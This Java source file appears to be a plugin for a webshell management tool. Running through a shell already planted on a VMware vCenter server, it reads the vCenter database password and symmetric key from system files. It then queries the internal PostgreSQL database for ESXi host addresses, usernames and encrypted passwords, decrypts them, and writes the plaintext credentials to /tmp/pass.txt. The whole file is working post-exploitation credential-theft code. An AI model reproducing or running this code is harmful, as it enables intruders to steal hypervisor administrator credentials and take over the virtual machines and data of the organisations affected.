package shells.plugins.vc;

import core.ApplicationContext;
import core.Db;
import core.Encoding;
import core.imp.Payload;
import core.shell.ShellEntity;
import util.Log;
import util.http.ReqParameter;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Properties;

public class PasswordDecryptor {

    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    private String vcdb = "/etc/vmware-vpx/vcdb.properties";
    private String key = "/etc/vmware-vpx/ssl/symkey.dat";

    private void init(){
        boolean isWindows = this.payload.isWindows();
        if (isWindows){
            System.out.println("only linux");
        }
    }

    public PasswordDecryptor(ShellEntity shellEntity, Payload payload, Encoding encoding){
        this.encoding = encoding;
        this.payload = payload;
        this.shellEntity = shellEntity;
    }

    private String pkcs7unpadding(String text) {
        int length = text.length();
        int padding_length = (int) text.charAt(length - 1);
        return text.substring(0, length - padding_length);
    }

    private ArrayList<String> decrypt(String key, ArrayList<String[]> enc_passwords) throws Exception {
        ArrayList<String> passwords = new ArrayList<>();
        byte[] key_bytes = hexStringToByteArray(key);
        for (String[] enc_password : enc_passwords) {
            String ip = enc_password[0];
            String usr = enc_password[1];
            String enc_password_str = enc_password[2];
            byte[] content = Base64.getDecoder().decode(enc_password_str);
            byte[] iv_bytes = new byte[16];
            System.arraycopy(content, 0, iv_bytes, 0, iv_bytes.length);
            byte[] enc_password_bytes = new byte[content.length - iv_bytes.length];
            System.arraycopy(content, iv_bytes.length, enc_password_bytes, 0, enc_password_bytes.length);
            Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
            SecretKeySpec keySpec = new SecretKeySpec(key_bytes, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(iv_bytes);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
            byte[] password_bytes = cipher.doFinal(enc_password_bytes);
            String password = new String(password_bytes, "UTF-8");
            password = pkcs7unpadding(password);
            String line = ip + ":" + usr + ":" + password;
            System.out.println(line);
            passwords.add(line);
        }
        return passwords;
    }

    private void save_decrypt_password(String path, ArrayList<String> passwords) throws IOException {
        String data = String.join("\n", passwords);
        this.payload.uploadFile(path,data.getBytes());
    }

    private ArrayList<String[]> get_encrypt_password(String path) throws IOException {
        ArrayList<String[]> encrypt_passwords = new ArrayList<>();
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(path));
        byte[] result = this.payload.evalFunc(null, "readFile", parameter);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);
        Reader byteReader = new InputStreamReader(byteArrayInputStream);
        BufferedReader reader = new BufferedReader(byteReader);
        String line;
        while ((line = reader.readLine()) != null) {
            try {
                String[] elements = line.split("\\|");
                String ip = elements[0].trim();
                String usr = elements[1].trim();
                String pw = elements[2].trim();
                String encrypt_password = pw.replace("*", "").trim();
                encrypt_passwords.add(new String[]{ip, usr, encrypt_password});
            } catch (IndexOutOfBoundsException e) {
                break;
            }
        }
        reader.close();
        return encrypt_passwords;
    }

    private String get_password() throws IOException{
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(this.vcdb));
        byte[] result = this.payload.evalFunc(null, "readFile", parameter);
        Properties properties = new Properties();
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);
        properties.load(byteArrayInputStream);
        return properties.getProperty("password");
    }

    private void runRealCmd(String command){
        // 直接调用this.payload.execCommand 会有参数解析错误，参考 ShellExecCommandPanel.execEasyCommand 解决

        String command2  = "sh -c \"{command}\" 2>&1".replace("{command}", command);
        if (ApplicationContext.isOpenC("isSuperLog")) {
            Log.log("mode : %s command : %s", Db.getSetingValue("EXEC_COMMAND_MODE"), command2);
        }
        this.payload.execCommand(command2);
    }

    private void select_esxi_to_file(String psql_path) throws IOException {
        String command = psql_path + " --command 'select ip_address,user_name,password from vpx_host;' 'host=127.0.0.1 hostaddr=127.0.0.1 port=5432 user=vc password="+ get_password() +" dbname=VCDB'>/tmp/pass";
        // 查询到/tmp/pass
        runRealCmd(command);
        // 处理结果，保留查询数据
        runRealCmd(" sed -i '/^[  ]*$/d' /tmp/pass");
        runRealCmd(" sed -i '1d;2d;$d' /tmp/pass");
    }

    private String get_key() throws IOException {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(this.key));
        byte[] result = this.payload.evalFunc(null, "readFile", parameter);
        return new String(result);
    }

    private byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }

    public ArrayList<String> decryptor(String psql_path) throws Exception {
        String key = this.get_key();
        select_esxi_to_file(psql_path);
        ArrayList<String[]> encrypt_passwords = get_encrypt_password("/tmp/pass");
        ArrayList<String> passwords = decrypt(key.trim(), encrypt_passwords);
        save_decrypt_password("/tmp/pass.txt", passwords);
        return passwords;
    }

}
